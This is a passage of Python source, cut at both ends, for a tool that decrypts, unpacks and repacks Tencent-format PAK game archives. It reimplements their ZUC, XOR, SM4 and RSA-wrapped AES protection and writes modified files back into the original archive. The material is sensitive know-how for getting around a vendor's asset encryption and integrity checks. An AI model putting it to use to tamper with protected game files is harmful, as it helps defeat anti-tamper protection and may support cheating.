                        comp_data = fitted
                        aligned_len = fitted_aligned
                        console.print(
                            f"[green]  ✔ Fitted with smaller compression "
                            f"({aligned_len} ≤ {max_space})[/green]"
                        )
                    else:
                        console.print(
                            f"[red]  ❌ Block #{chunk_index} cannot fit in {max_space} bytes "
                            f"after all compression levels — skipping[/red]"
                        )
                        break

                # ✅ write block
                f_pak.seek(block_meta.start)
                f_pak.write(comp_data)
                if aligned_len < len(comp_data) + (max_space - aligned_len):
                    # pad if needed
                    padding = max_space - len(comp_data)
                    if padding > 0:
                        f_pak.write(b"\x00" * padding)

                console.print(
                    f"[green]  ✔ Repacked {base_filename} block #{chunk_index}[/green]"
                )
                break

            if not found:
                console.print(
                    f"[red]❌ Original file not found for {src_file.name}[/red]"
                )


class Misc:
    @staticmethod
    def pad_to_n(data: bytes, n: int) -> bytes:
        assert n > 0
        padding = n - (len(data) % n)
        if padding == n:
            return data
        return data + b'\x00' * padding

    @staticmethod
    def align_up(x: int, n: int) -> int:
        return ((x + n - 1) // n) * n


class Reader:
    def __init__(self, buffer, cursor=0):
        self._buffer = buffer
        self._cursor = cursor

    def u1(self, move_cursor=True) -> int:
        return self.unpack('B', move_cursor=move_cursor)[0]

    def u4(self, move_cursor=True) -> int:
        return self.unpack('<I', move_cursor=move_cursor)[0]

    def u8(self, move_cursor=True) -> int:
        return self.unpack('<Q', move_cursor=move_cursor)[0]

    def i1(self, move_cursor=True) -> int:
        return self.unpack('b', move_cursor=move_cursor)[0]

    def i4(self, move_cursor=True) -> int:
        return self.unpack('<i', move_cursor=move_cursor)[0]

    def i8(self, move_cursor=True) -> int:
        return self.unpack('<q', move_cursor=move_cursor)[0]

    def s(self, n: int, move_cursor=True) -> bytes:
        return self.unpack(f'{n}s', move_cursor=move_cursor)[0]

    def unpack(self, f: str | bytes, offset=0, move_cursor=True):
        x = struct.unpack_from(f, self._buffer, self._cursor + offset)
        if move_cursor:
            self._cursor += struct.calcsize(f)
        return x

    def string(self, move_cursor=True) -> str:
        length = self.i4(move_cursor=move_cursor)
        if length == 0:
            return str()
        assert length > 0
        offset = 0 if move_cursor else 4
        return self.unpack(f'{length}s', offset=offset, move_cursor=move_cursor)[0].rstrip(b'\x00').decode()


class PakInfo:
    def __init__(self, buffer, keystream: list[int]):
        def decrypt_index_encrypted(x: int) -> int:
            MASK_8 = 0xFF
            return (x ^ keystream[3]) & MASK_8

        def decrypt_magic(x: int) -> int:
            return x ^ keystream[2]

        def decrypt_index_hash(x: bytes) -> bytes:
            key = struct.pack('<5I', *keystream[4:][:5])
            assert len(x) == len(key)
            return bytes(a ^ b for a, b in zip(x, key))

        def decrypt_index_size(x: int) -> int:
            return x ^ ((keystream[10] << 32) | keystream[11])

        def decrypt_index_offset(x: int) -> int:
            return x ^ ((keystream[0] << 32) | keystream[1])

        reader = Reader(buffer[-PakInfo._mem_size(-1):])

        self.index_encrypted: bool = decrypt_index_encrypted(reader.u1()) == 1
        self.magic: int = decrypt_magic(reader.u4())
        self.version: int = reader.u4()
        self.index_hash: bytes = decrypt_index_hash(reader.s(20)) if self.version >= 6 else bytes()
        self.index_size: int = decrypt_index_size(reader.u8())
        self.index_offset: int = decrypt_index_offset(reader.u8())
        if self.version <= 3:
            self.index_encrypted = False

    @staticmethod
    def _mem_size(_: int) -> int:
        return 1 + 4 + 4 + 20 + 8 + 8


class TencentPakInfo(PakInfo):
    def __init__(self, buffer, keystream: list[int]):
        def decrypt_unk(x: bytes) -> bytes:
            key = struct.pack('<8I', *keystream[7:][:8])
            assert len(x) == len(key)
            return bytes(a ^ b for a, b in zip(x, key))

        def decrypt_stem_hash(x: int) -> int:
            return x ^ keystream[8]

        def decrypt_unk_hash(x: int) -> int:
            return x ^ keystream[9]

        super().__init__(buffer, keystream)

        reader = Reader(buffer[-TencentPakInfo._mem_size(self.version):])

        self.unk1: bytes = decrypt_unk(reader.s(32)) if self.version >= 7 else bytes()
        self.packed_key: bytes = reader.s(256) if self.version >= 8 else bytes()
        self.packed_iv: bytes = reader.s(256) if self.version >= 8 else bytes()
        self.packed_index_hash: bytes = reader.s(256) if self.version >= 8 else bytes()
        self.stem_hash: int = decrypt_stem_hash(reader.u4()) if self.version >= 9 else 0
        self.unk2: int = decrypt_unk_hash(reader.u4()) if self.version >= 9 else 0
        self.content_org_hash: bytes = reader.s(20) if self.version >= 12 else bytes()

    @staticmethod
    def _mem_size(version: int) -> int:
        size_for_7 = 32 if version >= 7 else 0
        size_for_8 = 256 * 3 if version >= 8 else 0
        size_for_9 = 4 * 2 if version >= 9 else 0
        size_for_12 = 20 if version >= 12 else 0
        return PakInfo._mem_size(version) + size_for_7 + size_for_8 + size_for_9 + size_for_12


class PakCompressedBlock:
    def __init__(self, reader: Reader):
        self.start: int = reader.u8()
        self.end: int = reader.u8()


@dataclass
class TencentPakEntry:
    def __init__(self, reader: Reader, version: int):
        self.content_hash: bytes = reader.s(20)
        if version <= 1:
            _ = reader.u8()
        self.offset: int = reader.u8()
        self.uncompressed_size: int = reader.u8()
        self.compression_method: int = reader.u4() & const.CM_MASK
        self.size: int = reader.u8()
        self.unk1: int = reader.u1() if version >= 5 else 0
        self.unk2: bytes = reader.s(20) if version >= 5 else bytes()
        self.compressed_blocks: list[PakCompressedBlock] = [PakCompressedBlock(reader) for _ in range(
            reader.u4())] if self.compression_method != 0 and version >= 3 else []
        self.compression_block_size: int = reader.u4() if version >= 4 else 0
        self.encrypted: bool = reader.u1() == 1 if version >= 4 else False
        self.encryption_method: int = reader.u4() if version >= 12 else 0
        self.index_new_sep: int = reader.u4() if version >= 12 else 0

    def _mem_size(self, version: int) -> int:
        size_for_123 = 20 + 8 + 8 + 4 + 8 + (8 if version == 1 else 0)
        size_for_4 = 4 + 1 if version >= 4 else 0
        size_for_compressed_blocks = 4 + len(self.compressed_blocks) * 16 if self.compressed_blocks else 0
        size_for_5 = 1 + 20 if version >= 5 else 0
        size_for_12 = 4 if version >= 12 else 0
        return size_for_123 + size_for_4 + size_for_5 + size_for_12 + size_for_compressed_blocks


class PakCrypto:
    class _LCG:
        def __init__(self, seed: int):
            self.state = seed

        def next(self) -> int:
            MASK_32 = 0xFFFFFFFF
            MSB_1 = 1 << 31

            def wrap(x: int) -> int:
                x &= MASK_32
                if not x & MSB_1:
                    return x
                else:
                    return ((x + MSB_1) & MASK_32) - MSB_1

            x1 = wrap(0x41C64E6D * self.state)
            self.state = wrap(x1 + 12345)
            x2 = wrap(x1 + 0x13038) if self.state < 0 else self.state
            return ((x2 >> 16) & MASK_32) % 0x7FFF

    @staticmethod
    def zuc_keystream() -> list[int]:
        zuc = gmalg.ZUC(const.ZUC_KEY, const.ZUC_IV)
        return [struct.unpack('>I', zuc.generate())[0] for _ in range(16)]

    @staticmethod
    def _xorxor(buffer, x) -> bytes:
        return bytes(buffer[i] ^ x[i % len(x)] for i in range(len(buffer)))

    @staticmethod
    def _hashhash(buffer, n: int) -> bytes:
        result = bytes()
        for i in range(math.ceil(n / SHA1.digest_size)):
            result += SHA1.new(buffer).digest()
        if len(result) >= n:
            result = result[:n]
        else:
            result += b'\x00' * (n - len(result))
        return result

    @staticmethod
    def _meowmeow(buffer) -> bytes:
        def unpad(x):
            skip = 1 + next((i for i in range(len(x)) if x[i] != 0))
            return x[skip:]

        if len(buffer) < 43:
            return bytes()

        x1 = buffer[1:][:SHA1.digest_size]
        x2 = buffer[SHA1.digest_size + 1:]
        x1 = PakCrypto._xorxor(x1, PakCrypto._hashhash(x2, len(x1)))
        x2 = PakCrypto._xorxor(x2, PakCrypto._hashhash(x1, len(x2)))

        part1, m = (x2[:SHA1.digest_size], x2[SHA1.digest_size:])
        if part1 != SHA1.new(b'\x00' * SHA1.digest_size).digest():
            return bytes()

        return unpad(m)

    @staticmethod
    def rsa_extract(signature: bytes, modulus: bytes) -> bytes:
        c = int.from_bytes(signature, 'little')
        n = int.from_bytes(modulus, 'little')
        e = 0x10001
        m = pow(c, e, n).to_bytes(256, 'little').rstrip(b'\x00')
        return PakCrypto._meowmeow(Misc.pad_to_n(m, 4))

    @staticmethod
    def _encrypt_simple1(plaintext) -> bytes:
        return bytes(x ^ const.SIMPLE1_DECRYPT_KEY for x in plaintext)

    @staticmethod
    def _decrypt_simple1(ciphertext) -> bytes:
        return bytes(x ^ const.SIMPLE1_DECRYPT_KEY for x in ciphertext)
    
    @staticmethod
    def _encrypt_simple2(plaintext) -> bytes:
        class RollingKey:
            def __init__(self, initial_value: int):
                self._value = initial_value

            def update(self, x: int) -> int:
                original_value = self._value
                self._value = x
                return original_value ^ x
        
        assert len(plaintext) % const.SIMPLE2_BLOCK_SIZE == 0
        
        initial_key, = struct.unpack('<I', const.SIMPLE2_DECRYPT_KEY)
        rolling_key = RollingKey(initial_key)
        ciphertext = (
            struct.pack('<I', rolling_key.update(x)) for x in struct.unpack(f'<{len(plaintext) // 4}I', plaintext)
        )
        return bytes(it.chain.from_iterable(ciphertext))


    @staticmethod
    def _decrypt_simple2(ciphertext) -> bytes:
        class RollingKey:
            def __init__(self, initial_value: int):
                self._value = initial_value

            def update(self, x: int) -> int:
                self._value ^= x
                return self._value

        assert len(ciphertext) % const.SIMPLE2_BLOCK_SIZE == 0

        initial_key, = struct.unpack('<I', const.SIMPLE2_DECRYPT_KEY)
        rolling_key = RollingKey(initial_key)
        plaintext = (
            struct.pack('<I', rolling_key.update(x)) for x in struct.unpack(f'<{len(ciphertext) // 4}I', ciphertext)
        )
        return bytes(it.chain.from_iterable(plaintext))

    @staticmethod
    @lru_cache(maxsize=1)
    def _derive_sm4_key(file_path: PurePath, encryption_method: int) -> bytes:
        part1 = file_path.stem.lower()
        if encryption_method == const.EM_SM4_2:
            secret = const.SM4_SECRET_2
        elif encryption_method == const.EM_SM4_4:
            secret = const.SM4_SECRET_4
        else:
            index = (encryption_method - const.EM_SM4_NEW_BASE) % len(const.SM4_SECRET_NEW)
            secret = f'{const.SM4_SECRET_NEW[index]}{encryption_method}'
        return SHA1.new(str(part1 + secret).encode()).digest()[:SM4.key_length()]

    @staticmethod
    @lru_cache(maxsize=1)
    def _sm4_context_for_key(key: bytes) -> SM4:
        return SM4(key)

    @staticmethod
    def _encrypt_sm4(plaintext, file_path: PurePath, encryption_method: int) -> bytes:
        padded_plaintext = pad(plaintext, SM4.block_length())

        key = PakCrypto._derive_sm4_key(file_path, encryption_method)
        sm4 = PakCrypto._sm4_context_for_key(key)
        return bytes(
            it.chain.from_iterable(
                sm4.encrypt(x) for x in it.batched(padded_plaintext, SM4.block_length())
            )
        )

    @staticmethod
    def _decrypt_sm4(ciphertext, file_path: PurePath, encryption_method: int) -> bytes:
        assert len(ciphertext) % SM4.block_length() == 0

        key = PakCrypto._derive_sm4_key(file_path, encryption_method)
        sm4 = PakCrypto._sm4_context_for_key(key)
        return bytes(
            it.chain.from_iterable(
                sm4.decrypt(x) for x in it.batched(ciphertext, SM4.block_length())
            )
        )


    @staticmethod
    def decrypt_index(ciphertext, pak_info: TencentPakInfo) -> bytes:
        if pak_info.version > 7:
            key = PakCrypto.rsa_extract(pak_info.packed_key, const.RSA_MOD_1)
            iv = PakCrypto.rsa_extract(pak_info.packed_iv, const.RSA_MOD_1)
            assert len(key) == 32 and len(iv) == 32

            aes = AES.new(key, MODE_CBC, iv[:16])
            return unpad(aes.decrypt(ciphertext), AES.block_size)
        else:
            return bytes(PakCrypto._decrypt_simple1(ciphertext))


    @staticmethod
    def _is_simple1_method(encryption_method: int) -> bool:
        return encryption_method == const.EM_SIMPLE1

    @staticmethod
    def _is_simple2_method(encryption_method: int) -> bool:
        return encryption_method == const.EM_SIMPLE2

    @staticmethod
    def _is_sm4_method(encryption_method: int) -> bool:
        return (encryption_method == const.EM_SM4_2
                or encryption_method == const.EM_SM4_4
                or encryption_method & const.EM_SM4_NEW_MASK != 0)

    @staticmethod
    def align_encrypted_content_size(n: int, encryption_method: int) -> int:
        if PakCrypto._is_simple2_method(encryption_method):
            return Misc.align_up(n, const.SIMPLE2_BLOCK_SIZE)
        elif PakCrypto._is_sm4_method(encryption_method):
            return Misc.align_up(n, SM4.block_length())
        else:
            return n
            
    @staticmethod
    def encrypt_block(plaintext, file: PurePath, encryption_method: int) -> bytes:
        if PakCrypto._is_simple1_method(encryption_method):
            return PakCrypto._encrypt_simple1(plaintext)
        elif PakCrypto._is_simple2_method(encryption_method):
            padded_plaintext = pad(plaintext, const.SIMPLE2_BLOCK_SIZE)
            return PakCrypto._encrypt_simple2(padded_plaintext)
        elif PakCrypto._is_sm4_method(encryption_method):
            return PakCrypto._encrypt_sm4(plaintext, file, encryption_method)
        else:
            assert False, f"Unknown encryption method: {encryption_method}"


    @staticmethod
    def decrypt_block(ciphertext, file: PurePath, encryption_method: int) -> bytes:
        if PakCrypto._is_simple1_method(encryption_method):
            return PakCrypto._decrypt_simple1(ciphertext)
        elif PakCrypto._is_simple2_method(encryption_method):
            return PakCrypto._decrypt_simple2(ciphertext)
        elif PakCrypto._is_sm4_method(encryption_method):
            return PakCrypto._decrypt_sm4(ciphertext, file, encryption_method)
        elif encryption_method == 0:
            return ciphertext
        else:
            return None
            
    @staticmethod
    @lru_cache(maxsize=33)
    def generate_block_indices(n: int, encryption_method: int) -> list[int]:
        if not PakCrypto._is_sm4_method(encryption_method):
            return list(range(n))

        permutation = []
        lcg = PakCrypto._LCG(n)
        while len(permutation) != n:
            x = lcg.next() % n
            if x not in permutation:
                permutation.append(x)

        inverse = [0] * len(permutation)
        for i, x in enumerate(permutation):
            inverse[x] = i

        return inverse

    @staticmethod
    def stat():
        print(PakCrypto._derive_sm4_key.cache_info())
        print(PakCrypto._sm4_context_for_key.cache_info())

class PakCompression:
    @staticmethod
    @lru_cache(maxsize=33)
    def _zstd_decompressor(dict_data: bytes | None) -> ZstdDecompressor:
        dict_obj = ZstdCompressionDict(dict_data, DICT_TYPE_AUTO) if dict_data else None
        return ZstdDecompressor(dict_obj)

    @staticmethod
    @lru_cache(maxsize=128) 
    def _zstd_compressor(dict_data: bytes | None, level: int) -> ZstdCompressor:
        dict_obj = ZstdCompressionDict(dict_data, DICT_TYPE_AUTO) if dict_data else None
        return ZstdCompressor(level=level, dict_data=dict_obj)

    @staticmethod
    def decompress_block(block, dict_data: bytes | None, compression_method: int) -> bytes:
        if compression_method == const.CM_ZLIB:
            return zlib.decompress(block)
        elif compression_method == const.CM_ZSTD or compression_method == const.CM_ZSTD_DICT:
            if compression_method != const.CM_ZSTD_DICT:
                dict_data = None
            return PakCompression._zstd_decompressor(dict_data).decompress(block)
        else:
            assert False, f"Unknown decompression method: {compression_method}"

    @staticmethod
    def compress_block(block, dict_data: bytes | None, compression_method: int, level: int | None = None) -> bytes:
        if compression_method == const.CM_ZLIB:
            use_level = level if level is not None else 9
            return zlib.compress(block, level=use_level)
        elif compression_method == const.CM_ZSTD or compression_method == const.CM_ZSTD_DICT:
            use_level = level if level is not None else 22
            if compression_method != const.CM_ZSTD_DICT:
                dict_data = None
            return PakCompression._zstd_compressor(dict_data, use_level).compress(block)
        else:
            assert False, f"Unknown compression method: {compression_method}"

class CompressionFinder:
    ZLIB_LEVELS_TO_TRY = list(range(9, 0, -1))
    ZSTD_LEVELS_TO_TRY = list(range(22, 0, -1)) + list(range(-1, -8, -1))

    @staticmethod
    def find_best_level(
        uncompressed_chunk: bytes, 
        original_compressed_size: int, 
        dict_data: bytes | None, 
        compression_method: int
    ) -> (int | None, int):
        
        levels_to_try = []
        default_level = 9
        if compression_method == const.CM_ZLIB:
            levels_to_try = CompressionFinder.ZLIB_LEVELS_TO_TRY
            default_level = 9
        elif compression_method in [const.CM_ZSTD, const.CM_ZSTD_DICT]:
            levels_to_try = CompressionFinder.ZSTD_LEVELS_TO_TRY
            default_level = 22
        else:
            return None, len(uncompressed_chunk)

        best_fit_level = None
        closest_size_so_far = -1

        for level in levels_to_try:
            compressed_data = PakCompression.compress_block(uncompressed_chunk, dict_data, compression_method, level=level)
            current_size = len(compressed_data)

            if original_compressed_size >= current_size > closest_size_so_far:
                closest_size_so_far = current_size
                best_fit_level = level
                if current_size == original_compressed_size:
                    break
        
        if best_fit_level is not None:
            return best_fit_level, closest_size_so_far

        final_compressed = PakCompression.compress_block(uncompressed_chunk, dict_data, compression_method, level=default_level)
        return default_level, len(final_compressed)

class TencentPakFile:
    def __init__(self, file_path: PurePath, is_od=False):
        self._file_path = file_path
        with open(file_path, 'rb') as file:
            self._file_content = memoryview(file.read())
        self._is_od = is_od
        self._mount_point = PurePath()
        self._is_zstd_with_dict = 'zsdic' in str(self._file_path)
        self._zstd_dict = None
        self._files: list[TencentPakEntry] = []
        self._index: dict[PurePath, dict[str, TencentPakEntry]] = {}
        self._pak_info = TencentPakInfo(self._file_content, PakCrypto.zuc_keystream())

        self._verify_stem_hash()
        self._tencent_load_index()

    def _verify_stem_hash(self) -> None:
        if not self._is_od and self._pak_info.version >= 9:
            assert self._pak_info.stem_hash == zlib.crc32(self._file_path.stem.encode('utf-32le'))

    def _tencent_load_index(self) -> None:
        index_data = self._file_content[self._pak_info.index_offset:][:self._pak_info.index_size]

        if self._pak_info.index_encrypted:
            index_data = PakCrypto.decrypt_index(index_data, self._pak_info)
        else:
            index_data = index_data

        self._verify_index_hash(index_data)
        self._load_index(index_data)

    def _verify_index_hash(self, index_data) -> None:
        expected_hash = self._pak_info.index_hash
        if not self._is_od and self._pak_info.version >= 8:
            assert expected_hash == PakCrypto.rsa_extract(self._pak_info.packed_index_hash, const.RSA_MOD_2)
        assert expected_hash == SHA1.new(index_data).digest()

    @staticmethod
    def _construct_mount_point(mount_point: str) -> PurePath:
        result = PurePath()
        for part in PurePath(mount_point).parts:
            if part != '..':
                result /= part
        return result

    def _peek_content(self, offset: int, size: int, encryption_method: int) -> memoryview:
        size = PakCrypto.align_encrypted_content_size(size, encryption_method)
        return self._file_content[offset:][:size]

    def _peek_block_content(self, block: PakCompressedBlock, encryption_method: int) -> memoryview:
        size = PakCrypto.align_encrypted_content_size(block.end - block.start, encryption_method)
        return self._file_content[block.start:][:size]

    def _construct_zstd_dict(self, dict_entry: TencentPakEntry) -> None:
        assert not self._zstd_dict
        assert not dict_entry.encrypted
        assert dict_entry.compression_method == const.CM_NONE

        reader = Reader(self._peek_content(dict_entry.offset, dict_entry.size, 0))

        dict_size = reader.u8()
        _ = reader.u4()
        assert dict_size == reader.u4()
        dict_data = reader.s(dict_size)
        self._zstd_dict = dict_data

    def _load_index(self, index_data) -> None:
        if self._pak_info.version <= 10:
            print(f"{Fore.YELLOW}Warning: This pak version is very old and may not be fully supported.{Fore.RESET}")

        reader = Reader(index_data)
        self._mount_point = self._construct_mount_point(reader.string())
        self._files = [TencentPakEntry(reader, self._pak_info.version) for _ in range(reader.u4())]

        try:
            num_dirs = reader.u8()
            for _ in range(num_dirs):
                dir_path = PurePath(reader.string())
                num_files_in_dir = reader.u8()
                e = {reader.string(): self._files[~reader.i4()] for _ in range(num_files_in_dir)}
                if self._is_zstd_with_dict and dir_path.name == 'zstddic':
                    assert len(e) == 1
                    self._construct_zstd_dict(e[[*e.keys()][0]])
                    continue
                self._index.update({PurePath(dir_path): e})
        except struct.error:
            print(f"{Fore.YELLOW}Note: Directory reading ended, possibly due to outdated pak format.{Fore.RESET}")
    
    def _get_method_str(self, method_int, is_encryption):
        if is_encryption:
            if PakCrypto._is_simple1_method(method_int): return "SIMPLE1"
            if PakCrypto._is_simple2_method(method_int): return "SIMPLE2"
            if PakCrypto._is_sm4_method(method_int): return f"SM4 (Type {method_int})"
            return "NONE" if method_int == 0 else "UNKNOWN"
        else:
            if method_int == const.CM_NONE: return "NONE"
            if method_int == const.CM_ZLIB: return "ZLIB"
            if method_int == const.CM_ZSTD: return "ZSTD"
            if method_int == const.CM_ZSTD_DICT: return "ZSTD_DICT"
            return "UNKNOWN"

    def _write_to_disk(self, file_path: Path, entry: TencentPakEntry) -> None:
        encryption_method = entry.encryption_method
        compression_method = entry.compression_method

        enc_str = self._get_method_str(encryption_method, True)
        comp_str = self._get_method_str(compression_method, False)
        console.print(f"[bold cyan]→ Extracting file[/] "f"[white]{file_path.name}[/] "f"[cyan][{comp_str}/{enc_str}][/]")

        with open(file_path, 'wb') as file:
            if compression_method == const.CM_NONE:
                data = self._peek_content(entry.offset, entry.size, encryption_method)
                if entry.encrypted:
                    data = PakCrypto.decrypt_block(bytes(data), file_path, encryption_method)
                file.write(data)
                return

            decrypted_uncompressed_data = bytearray()
            for x in PakCrypto.generate_block_indices(len(entry.compressed_blocks), encryption_method):
                data = self._peek_block_content(entry.compressed_blocks[x], encryption_method)
                if entry.encrypted:
                    data = PakCrypto.decrypt_block(bytes(data), file_path, encryption_method)
                
                if data is None:
                  # console.print(f"[yellow][!] Skipped unknown encryption:[/] {file_path.name}")
                   file_path.with_suffix(file_path.suffix + ".enc").write_bytes(bytes(data or b""))
                   return
                if not data:
                    continue
                try:
                    decompressed_data = PakCompression.decompress_block(bytes(data),self._zstd_dict,compression_method)
                except Exception as e:
                     console.print(f"[yellow][!] Decompression failed:[/] {file_path.name}")
                     print("Reason:", repr(e))
                     file_path.with_suffix(file_path.suffix + ".raw").write_bytes(data)
                     return
                decrypted_uncompressed_data.extend(decompressed_data)
            file.write(decrypted_uncompressed_data[:entry.uncompressed_size])

    # ========== UNPACK FUNCTION (From 3.py) ==========
    def dump(self, out_path: Path) -> None:
        """Unpack PAK file to output directory - From 3.py"""
        out_path = out_path / self._mount_point
        out_path.mkdir(parents=True, exist_ok=True)
        
        console.print(f"[bold green]STARTING UNPACK:[/] [cyan]{self._file_path.name}[/] → [bold cyan]{out_path}[/]")

        for dir_path, dir_content in self._index.items():
            current_out_path = out_path / dir_path
            current_out_path.mkdir(parents=True, exist_ok=True)
            for file_name, entry in dir_content.items():
                self._write_to_disk(current_out_path / file_name, entry)
        
        console.print(f"[bold green]SUCCESS:[/] Successfully extracted [cyan]{self._file_path.name}[/] to [bold cyan]{out_path}[/]")

        # ── Generate CHETAN-style debug log ──────────────────────────────────
        try:
            pak_stem = Path(self._file_path).stem
            # Log goes into the unpack output root (before mount point subdir)
            log_dir = out_path.parent
            log_dir.mkdir(parents=True, exist_ok=True)
            log_path = log_dir / f"@Black_Toxic000_DEBUG_{pak_stem}.log"

            def _enc_label(m):
                if m == 0:   return "UNKNOWN(0)"
                if PakCrypto._is_simple1_method(m): return "SIMPLE1"
                if PakCrypto._is_simple2_method(m): return "SIMPLE2"
                if PakCrypto._is_sm4_method(m):     return f"SM4_NEW({m})"
                return f"UNKNOWN({m})"

            def _comp_label(m):
                if m == 0:                  return "NONE (0)"
                if m == const.CM_ZLIB:      return "ZLIB (1)"
                if m == const.CM_ZSTD:      return "ZSTD (2)"
                if m == const.CM_ZSTD_DICT: return "ZSTD_DICT (3)"
                return f"UNKNOWN ({m})"

            lines = []
            lines.append("=" * 80)
            lines.append("PAK UNPACKING DEBUG LOG")
            lines.append("=" * 80)
            lines.append("")
            lines.append(f"PAK File: {self._file_path}")
            lines.append(f"PAK Info Version: {self._pak_info.version}")
            lines.append(f"Mount Point: {self._mount_point}")
            lines.append(f"Is ZSTD with Dict: {self._is_zstd_with_dict}")
            lines.append(f"Has ZSTD Dict: {self._zstd_dict is not None}")
            lines.append("-" * 80)
            lines.append("")
            lines.append("")

            file_counter = 0
            # Collect compression/encryption stats for summary
            comp_counts  = {}
            enc_counts   = {}
            block_dist   = {}

            for dir_path, dir_content in self._index.items():
                for file_name, entry in dir_content.items():
                    file_counter += 1
                    full_path = str(dir_path / file_name)

                    comp_label = _comp_label(entry.compression_method)
                    enc_label  = _enc_label(entry.encryption_method)
                    num_blocks = len(entry.compressed_blocks)
                    total_comp = sum(b.end - b.start for b in entry.compressed_blocks) if entry.compressed_blocks else 0

                    # Stats
                    comp_counts[comp_label] = comp_counts.get(comp_label, 0) + 1
                    enc_counts[enc_label]   = enc_counts.get(enc_label, 0) + 1
                    block_dist[num_blocks]  = block_dist.get(num_blocks, 0) + 1

                    lines.append(f"[{file_counter}] {full_path}")
                    lines.append("  " + "─" * 60)
                    lines.append(f"  Uncompressed Size: {entry.uncompressed_size:,} bytes")
                    lines.append(f"  Compressed Size:   {entry.size:,} bytes")
                    lines.append(f"  Compression Method: {comp_label}")
                    lines.append(f"  Encryption Method: {enc_label}")
                    lines.append(f"  Is Encrypted: {entry.encrypted}")
                    lines.append(f"  Compressed Blocks: {num_blocks}")
                    lines.append(f"  Compression Block Size: {entry.compression_block_size:,} bytes")

                    if entry.compressed_blocks:
                        lines.append(f"  Total Compressed Space: {total_comp:,} bytes")
                        lines.append(f"  Available for Repack: {total_comp:,} bytes")
                        ratio = (entry.size / entry.uncompressed_size * 100) if entry.uncompressed_size else 0
                        lines.append(f"  Compression Ratio: {ratio:.2f}%")
                        show = min(10, num_blocks)
                        lines.append(f"  Block Details (first {show} of {num_blocks}):")
                        for bi, blk in enumerate(entry.compressed_blocks[:show]):
                            lines.append(f"    Block {bi}: Offset={blk.start:,} Size={blk.end - blk.start:,} bytes")
                        if num_blocks > 10:
                            lines.append(f"    ... and {num_blocks - 10} more blocks")
                        blk_sizes = [b.end - b.start for b in entry.compressed_blocks]
                        lines.append(f"  Min Block Size: {min(blk_sizes):,} bytes")
                        lines.append(f"  Max Block Size: {max(blk_sizes):,} bytes")
                        lines.append(f"  Avg Block Size: {int(sum(blk_sizes)/len(blk_sizes)):,} bytes")
                        lines.append(f"  Available Space per Block: See block details")
                    else:
                        lines.append(f"  Available Space per Block: N/A")

                    lines.append("  " + "─" * 60)
                    lines.append("")

            # Summary
            total_files = file_counter
            lines.append("=" * 80)
            lines.append("SUMMARY STATISTICS")
            lines.append("=" * 80)
            lines.append("")
            lines.append(f"Total Files: {total_files}")
            lines.append("")
            lines.append("Compression Methods:")
            for k, v in sorted(comp_counts.items()):
                lines.append(f"  {k.split(' ')[0]}: {v} files ({v/total_files*100:.1f}%)")
            lines.append("")
            lines.append("Encryption Methods:")
            for k, v in sorted(enc_counts.items()):
                lines.append(f"  {k}: {v} files ({v/total_files*100:.1f}%)")
            lines.append("")
            lines.append("Block Count Distribution:")
            for k in sorted(block_dist.keys()):
                v = block_dist[k]
                lines.append(f"  {k:4d} blocks: {v:4d} files ({v/total_files*100:5.1f}%)")
            lines.append("")
            single = block_dist.get(1, 0)
            multi  = total_files - block_dist.get(0, 0) - single
            lines.append("Compression Efficiency Analysis:")
            lines.append(f"  Single-block files: {single} ({single/total_files*100:.1f}%)")
            lines.append(f"  Multi-block files:  {multi} ({multi/total_files*100:.1f}%)")
            lines.append("")
            lines.append("=" * 80)
            lines.append("END OF LOG")
            lines.append("=" * 80)

            with open(log_path, "w", encoding="utf-8") as lf:
                lf.write("\n".join(lines))

            console.print(f"[bold green]📋 Debug log saved:[/] [cyan]{log_path}[/]")
        except Exception as _log_err:
            console.print(f"[yellow]⚠ Could not write debug log: {_log_err}[/yellow]")
        # ── End debug log ─────────────────────────────────────────────────────

    # ========== REPACK FUNCTION (From 3.py) ==========
    def repack(self, repack_dir: PurePath, target_pak_path: Path,
               report: "RepackReport | None" = None):
        """Repack modified files into PAK — with large-block support."""
        console.print(f"\n[bold green]STARTING REPACK PROCESS:[/] [cyan]{target_pak_path.name}[/]")

        repack_base_path = repack_dir / self._mount_point

        with open(target_pak_path, "r+b") as target_file:
            for dir_path, dir_content in self._index.items():
                for file_name, entry in dir_content.items():
                    modified_file_path = repack_base_path / dir_path / file_name

                    if not modified_file_path.exists():
                        continue

                    enc_str  = self._get_method_str(entry.encryption_method, True)
                    comp_str = self._get_method_str(entry.compression_method, False)
                    console.print(
                        f"\n[bold yellow]-> REPACKING FILE:[/] [yellow]{file_name}[/] "
                        f"[dim yellow][{comp_str}/{enc_str}][/]"
                    )
                    # ── [REPACK] summary line (Chetan-style) ──────────────────────
                    console.print(
                        f"[bold cyan][REPACK][/]\n"
                        f"[white]{dir_path / file_name}[/] "
                        f"| [dim]Compression: {entry.compression_method} "
                        f"| Encryption: {entry.encryption_method} "
                        f"| Blocks: {max(len(entry.compressed_blocks), 1)}[/]"
                    )

                    total_blocks    = max(len(entry.compressed_blocks), 1)
                    repacked_blocks = 0
                    skipped_blocks  = 0
                    failed_blocks   = 0

                    try:
                        with open(modified_file_path, "rb") as f_modified:
                            modified_data = f_modified.read()

                        # ── ENTRY DEBUG INFO ──────────────────────────────────────
                        _total_comp_space = sum(
                            b.end - b.start for b in entry.compressed_blocks
                        ) if entry.compressed_blocks else entry.size

                        console.print("ENTRY DEBUG INFO:")
                        console.print(f"  \u2022 Uncompressed size: {entry.uncompressed_size}")
                        console.print(f"  \u2022 Compressed size: {entry.size}")
                        console.print(f"  \u2022 Compression method: {entry.compression_method}")
                        console.print(f"  \u2022 Encryption method: {entry.encryption_method}")
                        console.print(f"  \u2022 Encrypted: {entry.encrypted}")
                        console.print(f"  \u2022 Blocks: {len(entry.compressed_blocks)}")
                        console.print(f"  \u2022 Block size: {entry.compression_block_size}")
                        console.print(f"  \u2022 Block ranges:")
                        for _bi, _blk in enumerate(entry.compressed_blocks):
                            console.print(
                                f"    Block {_bi}: {_blk.start} - {_blk.end} "
                                f"(size: {_blk.end - _blk.start})"
                            )

                        # ── REPACK DEBUG ──────────────────────────────────────────
                        _new_data_size = len(modified_data)
                        console.print("REPACK DEBUG:")
                        console.print(f"  Original uncompressed: {entry.uncompressed_size:,} bytes")
                        console.print(f"  New data size: {_new_data_size:,} bytes")
                        console.print(f"  Blocks: {max(len(entry.compressed_blocks), 1)}")
                        console.print(f"  Total compressed space: {_total_comp_space:,} bytes")

                        # ── ABORT if new file is larger than original ─────────────
                        if _new_data_size > entry.uncompressed_size:
                            console.print(
                                f"[bold red]❌ CRITICAL: New data size mismatch![/]\n"
